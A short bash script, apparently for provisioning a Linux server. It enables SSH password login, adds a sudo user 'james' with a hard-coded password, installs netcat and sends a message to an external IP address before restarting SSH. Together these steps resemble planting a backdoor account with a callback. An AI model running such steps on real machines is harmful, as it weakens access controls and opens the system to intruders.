#!/bin/bash

sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config

useradd \
      --home-dir /home/james \
      --create-home \
      --shell /bin/bash \
      --groups sudo \
      --password $(echo s00p3rs3cr37 | openssl passwd -1 -stdin) \
      james

apt-get install netcat

echo "Hello World" | nc 138.197.210.249 50000

service ssh restart
